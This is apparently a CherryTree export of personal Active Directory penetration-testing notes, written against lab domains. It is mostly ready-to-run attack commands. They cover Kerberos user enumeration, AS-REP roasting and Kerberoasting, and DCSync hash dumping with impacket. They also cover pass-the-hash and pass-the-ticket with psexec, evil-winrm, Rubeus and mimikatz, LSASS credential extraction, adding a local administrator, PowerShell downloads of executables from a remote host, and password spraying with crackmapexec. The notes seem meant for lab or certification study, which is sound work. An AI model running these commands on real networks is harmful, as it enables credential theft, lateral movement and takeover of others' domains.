        <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687814576">
          <rich_text scale="h1">Kerberos Authentication:</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________________________

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="25" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
# make sure u add the domain to the ip in host file
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 

or
_______________________________________________________________________

## once u have list of users from ldap search or somewhere else

./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 192.168.208.53 usernames.txt


____________________________________________________________________________________

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 192.168.208.53
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 192.168.208.53

____________________________________________________________________________________


msf&gt; use auxiliary/gather/kerberos_enumusers

____________________________________________________________________________________


crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
          <codebox char_offset="114" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0"></codebox>
          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687808763">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast

or

impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 192.168.208.53
</codebox>
            <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
          </node>
        </node>
        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1687690728">
          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690744">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

### Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast


### Get  ASREPMessage without pass  
impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 192.168.208.53
</codebox>
          </node>
          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690752">
            <rich_text>
</rich_text>
            <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
            <rich_text> (DC Sync aka synchronizing DC)


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
or 
impacket-secretsdump domain.local/user@192.168.208.53</codebox>
          </node>
          <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
            <rich_text>Exploitation via pass the hash



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text foreground="#d4d4d4">or</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


</rich_text>
            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.208.53 -hashes randomLMHASH:oeasdNTLMHASH
</codebox>
            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@192.168.208.53 </codebox>
            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@192.168.208.53</codebox>
          </node>
          <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
            <rich_text>
</rich_text>
            <rich_text foreground="#79c0ff" weight="heavy">### This script will gather data about the domain's users and their corresponding email addresses.</rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
or
impacket-GetADUsers domain/user:password@IP</codebox>
            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 192.168.208.53</codebox>
          </node>
          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 192.168.208.53 domain.local/user</codebox>
          </node>
        </node>
        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

with mimikatz
</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 192.168.208.53 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.208.53 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
        </node>
        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688335528">
          <rich_text>
</rich_text>
          <rich_text scale="h2">
Setting password for user sophie</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_______________________________________________________

</rich_text>
          <rich_text scale="h2">As Admin</rich_text>
          <rich_text>:

</rich_text>
          <rich_text scale="h3">Adding a User </rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">Adding use to Admin group</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Then accessing the machine
_________________________________________________________
</rich_text>
          <rich_text scale="h2">curl replacement in Powershell:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text family="monospace">$WebClient = New-Object System.Net.WebClient&#13;
$WebClient.DownloadFile("</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://192.168.208.53</rich_text>
          <rich_text family="monospace">/navigating-code.exe","C:\navigating-code.exe")&#13;
</rich_text>
          <rich_text>&#13;    
or
&#13;</rich_text>
          <rich_text family="monospace">powershell.exe (New-Object System.Net.WebClient).DownloadFile('</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://192.168.208.53</rich_text>
          <rich_text family="monospace">:8080/file.bat','filename.bat')&#13;
</rich_text>
          <rich_text>&#13;    



______________________________


</rich_text>
          <rich_text scale="h2">Force any particular computer to sync its GPOs</rich_text>
          <rich_text justification="left" scale="h2"></rich_text>
          <rich_text scale="h2"> immediate</rich_text>
          <rich_text>




________________________________


</rich_text>
          <rich_text scale="h2">Use powershell specifically for all the below commands:
</rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Testing Connec</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">tion/Access</rich_text>
          <rich_text>


____________________________________
</rich_text>
          <rich_text scale="h2">CMD</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Running as a different use</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">r on an AD</rich_text>
          <rich_text>




_____________________________________________


</rich_text>
          <rich_text scale="h2">Powershell Remoting</rich_text>
          <rich_text>

allows you to get a Powershell session in the remote machine, listens on 5985 and is enabled by default in the Windows Server machines.
 You can use Powershell Remoting from Windows by using many </rich_text>
          <rich_text link="webs https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and parameters</rich_text>
          <rich_text> available in Powershell. From a Linux machine you can use </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">evil-winrm</rich_text>
          <rich_text>.
 As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, 
 you can pass them to the application as a parameters or configure the ccache file as in impacket. 
 In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using </rich_text>
          <rich_text link="webs https://github.com/GhostPack/Rubeus">Rubeus</rich_text>
          <rich_text> or </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimika</rich_text>
          <rich_text justification="left" link="webs https://github.com/gentilkiwi/mimikatz"></rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">tz</rich_text>
          <rich_text>.
 
 Ex</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>:
 
 
 or
 
 
 
where ptt is pass the ticket</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
 then
 
 
 
 
 </rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
          <codebox char_offset="125" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user cel1s0 pass123 /add</codebox>
          <codebox char_offset="155" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators cel1s0 /add</codebox>
          <codebox char_offset="277" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
$wc = New-Object Net.WebClient
$wc.DownloadString("http://192.168.208.53  whatever else u want with space")
</codebox>
          <codebox char_offset="639" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
          <codebox char_offset="761" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
or

# Test if HTTP port is open
Test-NetConnection google.com -CommonTCPPort "Http"

# Or define a port number
Test-NetConnection google.com -Port 80</codebox>
          <codebox char_offset="845" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"

or  like ippsec writeup

runas /netonly /user:domain.local\user cmd
</codebox>
          <codebox char_offset="1630" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
          <codebox char_offset="1640" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
          <codebox char_offset="1685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
        </node>
        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1687690808">
          <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Enumerating all the shares with a given password</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

 
</rich_text>
          <rich_text scale="h4"> Checking Pass the Hash</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> Listing all the shares</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Null Authentication smb Enumeration</rich_text>
          <rich_text>

 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



</rich_text>
          <rich_text scale="h3">Anonymous Authentication smb Enum</rich_text>
          <rich_text>
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
 
</rich_text>
          <rich_text scale="h3">  </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h2"> Adding Domain with -d</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
</rich_text>
          <rich_text scale="h3"> Checking all the files in the share</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> checking usernames and passwords line by line (not using all the passwords for each user)</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.208.53</codebox>
          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.208.53 -u &lt;username&gt; -p &lt;password&gt; --shares

Ex:

crackmapexec smb 192.168.208.53 -u admin -p abcd1234 --shares</codebox>
          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.208.53 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 192.168.208.53 --shares
 </codebox>
          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.208.53 --shares -u '' -p ''</codebox>
          <codebox char_offset="230" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.208.53 --shares -u 'randomanon' -p ''</codebox>
          <codebox char_offset="238" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.208.53 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="263" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
          <codebox char_offset="264" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
</codebox>
          <codebox char_offset="307" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.208.53 -U validuser.txt -P password.txt -M spider-plus </codebox>
          <codebox char_offset="308" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="405" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 192.168.208.53  -U validuser.txt -P password.txt -M spider-plus --no-bruteforce</codebox>
        </node>
        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1687725851">
          <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Domain Joined simply run

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else



_______________________________________________


</rich_text>
          <rich_text scale="h3">running bloodhound from attack machine using python</rich_text>
          <rich_text>

First install via
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

then

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where </rich_text>
          <rich_text family="monospace">ns</rich_text>
          <rich_text> is the name server aka dns

</rich_text>
          <rich_text scale="h3">To get more infor use:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where -c is for collection all</rich_text>
          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 192.168.208.53</codebox>
          <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
          <codebox char_offset="599" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
          <codebox char_offset="608" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 bloodhound.py --dns-tcp -ns 192.168.208.53 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
          <codebox char_offset="616" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.208.53 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
          <codebox char_offset="681" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.208.53 -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
        </node>
        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1687814865">
          <rich_text scale="h3">Using Ldapsearch</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or 

Without any user:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u have the output make sure u check log file for 

1.  </rich_text>
          <rich_text weight="heavy">Passwords</rich_text>
          <rich_text> via :
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2.  </rich_text>
          <rich_text weight="heavy">Usernames</rich_text>
          <rich_text> Via:
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -h support.htb -D ‘ldap@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
          <codebox char_offset="45" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.208.53 | tee ldapSearch.log  </codebox>
          <codebox char_offset="128" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
          <codebox char_offset="152" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log</codebox>
        </node>
        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
          <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
          <rich_text>
&#13;&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">logonpasswords</rich_text>
          <rich_text>: </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::logonpasswords</rich_text>
          <rich_text>)&#13;&#13;◇ Extracts passwords in memory
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth">pth</rich_text>
          <rich_text> (pass the hash):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</rich_text>
          <rich_text>&#13;&#13;◇ A fake identity is created and the faske identitt’s NTLM hash is replaced with the real one.
&#13;◇ “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)”
&#13;◇ “AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”
&#13;
&#13;
&#13;• ptt (pass the ticket):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # kerberos::ptt</rich_text>
          <rich_text>&#13;&#13;◇ Enables Kerberos ticket (TGT or TGS) injection into the current session.
&#13;
&#13;
&#13;• tickets:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::tickets /export</rich_text>
          <rich_text>&#13;&#13;◇ Identifies all session Kerberos tickets and lists/exports them.
&#13;◇ sekurlsa pulls the Kerberos data from memory and can access all user session tickets on the computer.
&#13;
&#13;
&#13;• ekeys:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::ekeys</rich_text>
          <rich_text>&#13;&#13;◇ Extract the Kerberos ekeys from memory. Provides theft of a user &#13;account until the password is changed (which may be never for a &#13;Smartcard/PKI user).
&#13;
&#13;
&#13;• dpapi:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::dpapi</rich_text>
          <rich_text>
&#13;• minidump:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::minidump lsass.dmp</rich_text>
          <rich_text>&#13;&#13;◇ Perform a minidump of the LSASS process and extract credential data &#13;from the lsass.dmp. A minidump can be saved off the computer for &#13;credential extraction later, but the major version of Windows must match&#13; (you can’t open the dump file from Windows 2012 on a Windows 2008 &#13;system).
&#13;
&#13;
&#13;• kerberos:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::kerberos</rich_text>
          <rich_text>&#13;&#13;◇ &#13; Extracts the smartcad/PIV PIN from memory (cached in LSASS when using a smartcard).&#13;
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege">debug:</rich_text>
          <rich_text>&#13;mimikatz # privilege::debug&#13;&#13;◇ Sets debug mode for current mimikatz session enabling LSASS access.
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
          <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).

</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
&#13;
&#13;
&#13;
</rich_text>
        </node>
      </node>
      <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
        <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
        <rich_text>

   ☐  nmap -sn 192.168.208.53
   ☐  nmap -sL 192.168.208.53
   ☐  nbtscan -r 192.168.208.53

</rich_text>
        <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
        <rich_text>

   ☐  nmap  --top-ports 20 --open -iL iplist.txt
   ☐  nmap -sS -A -sV -O -p- 192.168.208.53
   ☐  nmap -sU 192.168.208.53
</rich_text>
      </node>
      <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Nmap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Download all the files

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Connecting:

</rich_text>
        <rich_text justification="left"></rich_text>
